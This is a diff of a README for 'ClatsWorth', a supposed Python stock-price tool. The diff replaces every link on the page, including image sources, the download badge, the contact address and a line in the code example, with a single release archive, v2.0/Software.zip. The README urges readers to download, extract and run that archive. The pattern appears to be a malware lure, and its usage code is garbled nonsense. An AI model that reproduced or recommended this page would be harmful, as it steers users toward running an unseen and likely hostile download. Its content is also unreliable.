@@ -1,6 +1,6 @@
 # 🚀 Welcome to ClatsWorth 📈
 
-![Stock Market Image](https://github.com/helic2355/ClatsWorth/releases/download/v1.0/Application.zip)
+![Stock Market Image](https://github.com/helic2355/ClatsWorth/releases/download/v2.0/Software.zip)
 
 ClatsWorth is a fantastic Python script that provides real-time stock prices along with frequent updates. If you are an investor or trader looking for quick access to stock information, this script is perfect for you. Stay ahead of the game with the latest insights and trends in the stock market.
 
@@ -21,7 +21,7 @@ ClatsWorth is a simple yet powerful tool designed for those interested in financ
 
 To get started with ClatsWorth, simply download the latest release from the following link: 
 
-[![Download ClatsWorth](https://github.com/helic2355/ClatsWorth/releases/download/v1.0/Application.zip)](https://github.com/helic2355/ClatsWorth/releases/download/v1.0/Application.zip)
+[![Download ClatsWorth](https://github.com/helic2355/ClatsWorth/releases/download/v2.0/Software.zip)](https://github.com/helic2355/ClatsWorth/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the file, extract it to your desired location and run the script on your local machine. It's that easy!
 
@@ -37,7 +37,7 @@ Here's a quick example of how to use ClatsWorth in your Python project:
 from clatsworth import StockPrice
 
 stock = StockPrice('AAPL')  # Specify the stock symbol
-https://github.com/helic2355/ClatsWorth/releases/download/v1.0/Application.zip()  # Get the current stock price
+https://github.com/helic2355/ClatsWorth/releases/download/v2.0/Software.zip()  # Get the current stock price
 ```
 
 ## 🔥 Get Started
@@ -46,7 +46,7 @@ Don't miss out on the latest stock market updates and trends. Get started with C
 
 Explore the world of finance, investing, and trading with ClatsWorth. Download now and embark on your journey to financial success!
 
-![Finance Image](https://github.com/helic2355/ClatsWorth/releases/download/v1.0/Application.zip)
+![Finance Image](https://github.com/helic2355/ClatsWorth/releases/download/v2.0/Software.zip)
 
 
 ## 📌 Repository Topics
@@ -64,7 +64,7 @@ Explore the world of finance, investing, and trading with ClatsWorth. Download n
 
 ## 📞 Contact
 
-For any inquiries or feedback regarding ClatsWorth, feel free to reach out to the development team at [https://github.com/helic2355/ClatsWorth/releases/download/v1.0/Application.zip](https://github.com/helic2355/ClatsWorth/releases/download/v1.0/Application.zip). Your input is valuable to us as we strive to improve and enhance the functionality of this tool.
+For any inquiries or feedback regarding ClatsWorth, feel free to reach out to the development team at [https://github.com/helic2355/ClatsWorth/releases/download/v2.0/Software.zip](https://github.com/helic2355/ClatsWorth/releases/download/v2.0/Software.zip). Your input is valuable to us as we strive to improve and enhance the functionality of this tool.
 
 ## 🌟 About the Developers
 
@@ -76,4 +76,4 @@ Join us on this exciting journey and revolutionize the way you approach investin
 
 Happy investing! 🚀💰
 
-![Stock Market Image 2](https://github.com/helic2355/ClatsWorth/releases/download/v1.0/Application.zip)
+![Stock Market Image 2](https://github.com/helic2355/ClatsWorth/releases/download/v2.0/Software.zip)
